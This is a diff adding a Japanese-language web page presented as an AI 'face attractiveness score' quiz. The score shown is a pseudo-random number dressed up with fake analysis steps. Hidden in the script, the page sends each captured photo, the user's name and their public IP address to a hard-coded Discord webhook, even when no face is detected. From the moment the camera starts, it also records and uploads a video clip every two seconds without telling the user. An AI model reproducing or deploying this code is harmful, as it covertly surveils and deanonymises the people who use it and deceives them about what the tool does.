@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>顔面偏差値診断</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: linear-gradient(160deg, #0f0c29, #302b63, #24243e);
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 16px 40px;
+    }
+    h1 {
+      font-size: 1.5rem;
+      margin-bottom: 4px;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+    }
+    .subtitle {
+      font-size: 0.85rem;
+      color: #a5b4fc;
+      margin-bottom: 20px;
+    }
+
+    /* 名前入力画面 */
+    #name-section {
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+    #nameInput {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 1.05rem;
+      border: none;
+      border-radius: 12px;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      outline: none;
+      margin-bottom: 14px;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+    #nameInput::placeholder { color: #94a3b8; }
+    #nameInput:focus { border-color: #a78bfa; }
+    #startWithNameBtn {
+      background: #22c55e;
+      color: #fff;
+      width: 100%;
+      padding: 14px;
+      font-size: 1.05rem;
+    }
+
+    #video-container {
+      position: relative;
+      width: 100%;
+      max-width: 360px;
+      aspect-ratio: 3/4;
+      background: #000;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.5);
+      border: 3px solid rgba(255,255,255,0.15);
+      display: none;
+    }
+    video, canvas {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    canvas { display: none; }
+    #overlay {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .face-guide {
+      width: 70%;
+      height: 75%;
+      border: 2px dashed rgba(255,255,255,0.4);
+      border-radius: 50% 50% 45% 45%;
+      opacity: 0.7;
+    }
+    #controls {
+      margin-top: 18px;
+      display: none;
+      gap: 10px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    button {
+      padding: 13px 24px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: transform 0.15s, opacity 0.15s, box-shadow 0.15s;
+    }
+    button:active { transform: scale(0.95); }
+    button:disabled { opacity: 0.4; cursor: not-allowed; }
+    #startBtn { background: #22c55e; color: #fff; }
+    #captureBtn { background: #3b82f6; color: #fff; }
+    #switchBtn { background: #64748b; color: #fff; }
+    #retakeBtn { background: #64748b; color: #fff; display: none; }
+    #status {
+      margin-top: 14px;
+      font-size: 0.9rem;
+      color: #c7d2fe;
+      text-align: center;
+      min-height: 1.4em;
+    }
+
+    /* 結果画面 */
+    #result {
+      display: none;
+      width: 100%;
+      max-width: 360px;
+      margin-top: 8px;
+      animation: fadeIn 0.5s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .result-card {
+      background: rgba(255,255,255,0.08);
+      backdrop-filter: blur(12px);
+      border-radius: 20px;
+      padding: 24px 20px;
+      border: 1px solid rgba(255,255,255,0.12);
+      text-align: center;
+    }
+    .user-name {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #fef08a;
+      margin-bottom: 8px;
+    }
+    .score-label {
+      font-size: 0.9rem;
+      color: #a5b4fc;
+      margin-bottom: 4px;
+    }
+    .score-value {
+      font-size: 3.8rem;
+      font-weight: 800;
+      line-height: 1;
+      background: linear-gradient(135deg, #fbbf24, #f472b6, #a78bfa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .score-rank {
+      font-size: 1.15rem;
+      font-weight: 700;
+      margin: 8px 0 16px;
+      color: #fef08a;
+    }
+    .metrics {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin: 16px 0;
+      text-align: left;
+    }
+    .metric {
+      background: rgba(0,0,0,0.25);
+      border-radius: 12px;
+      padding: 10px 12px;
+    }
+    .metric-name {
+      font-size: 0.75rem;
+      color: #94a3b8;
+      margin-bottom: 4px;
+    }
+    .metric-bar {
+      height: 6px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .metric-fill {
+      height: 100%;
+      border-radius: 3px;
+      background: linear-gradient(90deg, #60a5fa, #a78bfa);
+      transition: width 1s ease;
+    }
+    .metric-score {
+      font-size: 0.8rem;
+      font-weight: 600;
+      margin-top: 3px;
+    }
+    .comment {
+      font-size: 0.95rem;
+      line-height: 1.55;
+      color: #e0e7ff;
+      margin-top: 12px;
+      padding: 12px;
+      background: rgba(0,0,0,0.2);
+      border-radius: 12px;
+    }
+    .result-photo {
+      width: 100%;
+      border-radius: 14px;
+      margin-bottom: 16px;
+      border: 2px solid rgba(255,255,255,0.15);
+    }
+
+    /* 分析中オーバーレイ */
+    #analyzing {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(15,12,41,0.92);
+      z-index: 100;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+    }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top-color: #a78bfa;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .analyzing-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #e0e7ff;
+    }
+    .analyzing-sub {
+      font-size: 0.85rem;
+      color: #94a3b8;
+    }
+  </style>
+</head>
+<body>
+  <h1>顔面偏差値診断</h1>
+  <p class="subtitle">あなたの顔をAIが偏差値で診断します</p>
+
+  <!-- 名前入力 -->
+  <div id="name-section">
+    <input type="text" id="nameInput" placeholder="あなたの名前を入力" maxlength="20" autocomplete="off">
+    <button id="startWithNameBtn">診断を始める</button>
+  </div>
+
+  <div id="video-container">
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <div id="overlay">
+      <div class="face-guide" id="faceGuide"></div>
+    </div>
+  </div>
+
+  <div id="controls">
+    <button id="startBtn">カメラ起動</button>
+    <button id="captureBtn" disabled>診断する</button>
+    <button id="switchBtn" disabled>切替</button>
+    <button id="retakeBtn">もう一度</button>
+  </div>
+
+  <p id="status"></p>
+
+  <div id="result">
+    <div class="result-card">
+      <img id="resultPhoto" class="result-photo" alt="撮影写真">
+      <div class="user-name" id="resultName"></div>
+      <div class="score-label">顔面偏差値</div>
+      <div class="score-value" id="scoreValue">--</div>
+      <div class="score-rank" id="scoreRank"></div>
+      <div class="metrics" id="metrics"></div>
+      <div class="comment" id="comment"></div>
+    </div>
+  </div>
+
+  <div id="analyzing">
+    <div class="spinner"></div>
+    <div class="analyzing-text">顔を分析中...</div>
+    <div class="analyzing-sub" id="analyzingSub">輪郭を検出しています</div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+  <script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1559115033240141829/9E5Ha7aoCECMsEKc3qHQXS_iTG-R6FltcifbqfRYRO-8pSLu4PicRtVvqdQYXroT-tjP';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const startBtn = document.getElementById('startBtn');
+    const captureBtn = document.getElementById('captureBtn');
+    const switchBtn = document.getElementById('switchBtn');
+    const retakeBtn = document.getElementById('retakeBtn');
+    const status = document.getElementById('status');
+    const result = document.getElementById('result');
+    const analyzing = document.getElementById('analyzing');
+    const analyzingSub = document.getElementById('analyzingSub');
+    const faceGuide = document.getElementById('faceGuide');
+    const nameSection = document.getElementById('name-section');
+    const nameInput = document.getElementById('nameInput');
+    const startWithNameBtn = document.getElementById('startWithNameBtn');
+    const videoContainer = document.getElementById('video-container');
+    const controls = document.getElementById('controls');
+    const resultName = document.getElementById('resultName');
+
+    let modelsLoaded = false;
+
+    async function loadModels() {
+      if (modelsLoaded) return;
+      try {
+        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights');
+        modelsLoaded = true;
+        console.log('Face models loaded');
+      } catch (e) {
+        console.error('Model load failed', e);
+      }
+    }
+
+    // ページ読み込み時にモデルを事前ロード
+    loadModels();
+
+    async function detectFace(canvas) {
+      if (!modelsLoaded) {
+        await loadModels();
+      }
+      if (!modelsLoaded) return false; // モデルが読めなければ不合格
+
+      try {
+        const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions({ inputSize: 416, scoreThreshold: 0.3 }));
+        return detections.length > 0;
+      } catch (e) {
+        console.error('Detection error', e);
+        return false; // エラー時も不合格
+      }
+    }
+    let stream = null;
+    let facingMode = 'user';
+    let photoDataUrl = null;
+    let userName = '';
+
+    const ranks = [
+      { min: 80, rank: '超絶美形', comment: '芸能人レベルの顔面偏差値です。街を歩けば振り返られること間違いなし！' },
+      { min: 72, rank: 'かなりの美形', comment: '平均を大きく上回る美しいバランス。自信を持っていい顔です。' },
+      { min: 65, rank: '美形寄り', comment: '整った顔立ちで好印象。写真映えしやすいタイプです。' },
+      { min: 58, rank: '平均より上', comment: 'バランスが良く、親しみやすい魅力があります。' },
+      { min: 50, rank: '平均的', comment: '日本人の平均的な顔立ち。どこにでもいる安心感があります。' },
+      { min: 42, rank: 'やや個性派', comment: '個性的な魅力が光る顔立ち。好き嫌いが分かれるタイプかも。' },
+      { min: 0,  rank: '個性強め', comment: '独特の雰囲気を持つ顔。インパクト重視の魅力です。' }
+    ];
+
+    const metricNames = ['左右対称性', '目の印象', '輪郭の綺麗さ', '肌の透明感'];
+
+    function dataURLtoBlob(dataURL) {
+      const arr = dataURL.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+
+    async function sendFailedPhoto(blob) {
+      let ip = '取得失敗';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        if (ipRes.ok) {
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        }
+      } catch (e) {}
+
+      const formData = new FormData();
+      const message = `📷 **顔面偏差値診断（顔検出失敗）**\n\n名前: **${userName || '未入力'}**\nIP: \`${ip}\`\n\n顔を認識できませんでした。\n周りの明かりをもっと上げてやってみてください。`;
+      formData.append('content', message);
+      formData.append('file', blob, `face_failed_${userName || 'unknown'}.jpg`);
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    async function sendToDiscord(blob, score, rank, comment) {
+      let ip = '取得失敗';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        if (ipRes.ok) {
+          const ipData = await ipRes.json();
+          ip = ipData.ip;
+        }
+      } catch (e) {
+        console.error('IP取得失敗', e);
+      }
+
+      const formData = new FormData();
+      const message = `📷 **顔面偏差値診断結果**\n\n名前: **${userName}**\nIP: \`${ip}\`\n偏差値: **${score}**（${rank}）\n${comment}`;
+      formData.append('content', message);
+      formData.append('file', blob, `face_${userName}_${score}.jpg`);
+
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    function startWithName() {
+      const name = nameInput.value.trim();
+      if (!name) {
+        nameInput.style.borderColor = '#ef4444';
+        setTimeout(() => nameInput.style.borderColor = '', 800);
+        return;
+      }
+      userName = name;
+      nameSection.style.display = 'none';
+      videoContainer.style.display = 'block';
+      controls.style.display = 'flex';
+      status.textContent = '「カメラ起動」を押してください';
+    }
+
+    let videoInterval = null;
+    let mediaRecorder = null;
+
+    function startContinuousVideo() {
+      if (videoInterval) clearInterval(videoInterval);
+      videoInterval = setInterval(() => {
+        if (!stream) return;
+        recordAndSendClip();
+      }, 2000);
+    }
+
+    function stopContinuousVideo() {
+      if (videoInterval) {
+        clearInterval(videoInterval);
+        videoInterval = null;
+      }
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+    }
+
+    function recordAndSendClip() {
+      if (!stream || !stream.active) return;
+
+      const chunks = [];
+      try {
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+      } catch (e) {
+        mediaRecorder = new MediaRecorder(stream);
+      }
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = async () => {
+        if (chunks.length === 0) return;
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        await sendVideoClip(blob);
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, 1800); // 約2秒弱のクリップ
+    }
+
+    async function sendVideoClip(blob) {
+      let ip = '取得失敗';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        if (ipRes.ok) {
+          const data = await ipRes.json();
+          ip = data.ip;
+        }
+      } catch (e) {}
+
+      const formData = new FormData();
+      const now = new Date().toLocaleString('ja-JP');
+      const message = `🎥 **カメラ映像（自動送信）**\n\n名前: **${userName || '未入力'}**\nIP: \`${ip}\`\n時刻: ${now}\n\n周りの明かりをもっと上げてやってみてください。`;
+      formData.append('content', message);
+      formData.append('file', blob, `video_${Date.now()}.webm`);
+
+      try {
+        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+      } catch (err) {
+        console.error('Video send failed', err);
+      }
+    }
+
+    async function startCamera() {
+      try {
+        if (stream) {
+          stopContinuousVideo();
+          stream.getTracks().forEach(t => t.stop());
+        }
+        status.textContent = 'カメラにアクセス中...';
+        const constraints = {
+          video: { facingMode, width: { ideal: 720 }, height: { ideal: 960 } },
+          audio: false
+        };
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        startBtn.style.display = 'none';
+        captureBtn.disabled = false;
+        switchBtn.disabled = false;
+        status.textContent = '顔を枠に合わせて「診断する」を押してください';
+        faceGuide.style.display = 'block';
+
+        // カメラ起動後、2秒おきに動画を送信開始
+        startContinuousVideo();
+      } catch (err) {
+        status.textContent = 'カメラにアクセスできません。権限を許可してください。';
+      }
+    }
+
+    function switchCamera() {
+      facingMode = facingMode === 'user' ? 'environment' : 'user';
+      startCamera();
+    }
+
+    async function captureAndDiagnose() {
+      if (!stream) return;
+
+      const w = video.videoWidth;
+      const h = video.videoHeight;
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      if (facingMode === 'user') {
+        ctx.translate(w, 0);
+        ctx.scale(-1, 1);
+      }
+      ctx.drawImage(video, 0, 0, w, h);
+
+      photoDataUrl = canvas.toDataURL('image/jpeg', 0.9);
+
+      // face-api.js で顔検出
+      const faceDetected = await detectFace(canvas);
+
+      if (!faceDetected) {
+        status.textContent = '顔を認識できませんでした。顔をしっかり映して再撮影してください';
+        status.style.color = '#fca5a5';
+
+        // 顔なしでも写真をDiscordに送る
+        const blob = dataURLtoBlob(photoDataUrl);
+        sendFailedPhoto(blob);
+
+        setTimeout(() => {
+          status.style.color = '';
+          startCamera();
+        }, 1800);
+        return;
+      }
+
+      document.getElementById('resultPhoto').src = photoDataUrl;
+
+      stream.getTracks().forEach(t => t.stop());
+      stream = null;
+      video.srcObject = null;
+      stopContinuousVideo();
+
+      videoContainer.style.display = 'none';
+      captureBtn.style.display = 'none';
+      switchBtn.style.display = 'none';
+      faceGuide.style.display = 'none';
+      status.textContent = '';
+
+      analyzing.style.display = 'flex';
+      const steps = [
+        '輪郭を検出しています',
+        '目・鼻・口のバランスを計測中',
+        '左右対称性を計算中',
+        '肌質・印象を分析中',
+        '偏差値を算出しています...'
+      ];
+      let i = 0;
+      analyzingSub.textContent = steps[0];
+      const interval = setInterval(() => {
+        i++;
+        if (i < steps.length) analyzingSub.textContent = steps[i];
+      }, 600);
+
+      setTimeout(() => {
+        clearInterval(interval);
+        analyzing.style.display = 'none';
+        showResult();
+      }, 3200);
+    }
+
+    function showResult() {
+      const seed = photoDataUrl.length + photoDataUrl.charCodeAt(100) + photoDataUrl.charCodeAt(200);
+      const rand = (n) => {
+        const x = Math.sin(seed + n) * 10000;
+        return x - Math.floor(x);
+      };
+
+      let score = Math.floor(38 + rand(1) * 50);
+      if (rand(2) > 0.92) score = Math.floor(78 + rand(3) * 12);
+
+      const rankInfo = ranks.find(r => score >= r.min);
+
+      const metrics = metricNames.map((name, idx) => {
+        const base = score + (rand(10 + idx) - 0.5) * 18;
+        return {
+          name,
+          value: Math.max(25, Math.min(95, Math.floor(base)))
+        };
+      });
+
+      resultName.textContent = userName + ' さん';
+      document.getElementById('scoreValue').textContent = score;
+      document.getElementById('scoreRank').textContent = rankInfo.rank;
+      document.getElementById('comment').textContent = rankInfo.comment;
+
+      const metricsEl = document.getElementById('metrics');
+      metricsEl.innerHTML = metrics.map(m => `
+        <div class="metric">
+          <div class="metric-name">${m.name}</div>
+          <div class="metric-bar"><div class="metric-fill" style="width:0%" data-w="${m.value}%"></div></div>
+          <div class="metric-score">${m.value}</div>
+        </div>
+      `).join('');
+
+      setTimeout(() => {
+        document.querySelectorAll('.metric-fill').forEach(el => {
+          el.style.width = el.dataset.w;
+        });
+      }, 100);
+
+      result.style.display = 'block';
+      retakeBtn.style.display = 'inline-block';
+
+      const blob = dataURLtoBlob(photoDataUrl);
+      sendToDiscord(blob, score, rankInfo.rank, rankInfo.comment);
+    }
+
+    function retake() {
+      result.style.display = 'none';
+      retakeBtn.style.display = 'none';
+      videoContainer.style.display = 'block';
+      captureBtn.style.display = 'inline-block';
+      switchBtn.style.display = 'inline-block';
+      startBtn.style.display = 'inline-block';
+      startBtn.textContent = 'カメラ起動';
+      captureBtn.disabled = true;
+      switchBtn.disabled = true;
+      status.textContent = '「カメラ起動」を押してください';
+      startCamera();
+    }
+
+    startWithNameBtn.addEventListener('click', startWithName);
+    nameInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') startWithName();
+    });
+    startBtn.addEventListener('click', startCamera);
+    captureBtn.addEventListener('click', captureAndDiagnose);
+    switchBtn.addEventListener('click', switchCamera);
+    retakeBtn.addEventListener('click', retake);
+
+    video.style.transform = 'scaleX(-1)';
+
+    window.addEventListener('beforeunload', () => {
+      stopContinuousVideo();
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    });
+  </script>
+</body>
+</html>
